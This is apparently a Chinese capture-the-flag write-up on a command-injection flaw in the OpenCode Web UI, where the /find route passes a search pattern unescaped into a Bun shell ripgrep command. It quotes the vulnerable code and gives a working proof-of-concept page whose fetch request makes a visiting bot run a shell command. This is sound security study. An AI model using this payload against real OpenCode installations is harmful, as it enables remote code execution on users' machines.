# OpenShell

## 题目简述

OpenCode Web UI 1day 题。后台运行 `opencode web`，前台 bot 访问选手提交的 `.pages.dev` 地址；`/find` 路由把 `pattern` 拼进 ripgrep 参数，并通过 Bun shell 的 `raw` 执行，导致命令注入。

## 解题过程

考察的是 OpenCode 的一个 1day。题目后台使用 `opencode web` 启动 OpenCode Web UI，前台 bot 会通过 Playwright 访问用户提交的 URL，且 URL 的 hostname 必须以 `.pages.dev` 结尾。

根据题目名称可以推测漏洞在 OpenCode 侧。分析 Web UI 可以发现 `/find` 路由会读取 GET 参数 `pattern`，并交给 `Ripgrep.search`：

https://github.com/anomalyco/opencode/blob/v1.2.16/packages/opencode/src/server/routes/file.ts#L37

```javascript
const pattern = c.req.valid("query").pattern // GET parameter
const result = await Ripgrep.search({
  cwd: Instance.directory,
  pattern,
  limit: 10,
})
return c.json(result)
```

继续跟进 ripgrep 调用逻辑：

https://github.com/anomalyco/opencode/blob/v1.2.16/packages/opencode/src/file/ripgrep.ts#L

```javascript
const args = [`${await filepath()}`, "--json", "--hidden", "--glob='!.git/*'"]
if (input.follow) args.push("--follow")
if (input.glob) {
  for (const g of input.glob) {
    args.push(`--glob=${g}`)
  }
}
if (input.limit) {
  args.push(`--max-count=${input.limit}`)
}
args.push("--")
args.push(input.pattern)
const command = args.join(" ")
const result = await $`${{ raw: command }}`.cwd(input.cwd).quiet().nothrow()
// command injection
if (result.exitCode !== 0) {
  return []
}
```

这里会把 GET 输入拼接到 ripgrep 参数中再执行。代码中 `$` 开头的内容是 Bun 的 shell 语法；正常参数化使用问题不大，但这里错误使用了 `raw`，导致传入命令不再转义，因此形成命令注入。

结合题目 bot 场景，需要让 bot 访问恶意页面来触发这个 GET 路由。由于请求不需要读取跨域响应，可以直接用 `fetch`、`window.open`、`img`、`script` 等方式触发。以 `fetch` 为例，保存下面内容为 `poc.html`：

```javascript
<script>fetch("http://127.0.0.1:4096/find?pattern=`open%20-a%20Calculator`");
</script>
```

然后在 Cloudflare Pages 上部署该 HTML，得到 `xxx.pages.dev` 域名后提交给 bot，即可触发 RCE。

## 方法总结

- 核心技巧：Bun shell raw 参数导致的命令注入，借 bot 访问 GET 路由触发。
- 识别信号：Web UI 搜索接口把用户输入拼接成 shell 命令，且使用 `raw`/未转义执行时，应优先验证命令注入。
- 复用要点：不需要读取跨域响应的 RCE 可以用 `fetch`、`img`、`script` 等方式让 bot 触发。
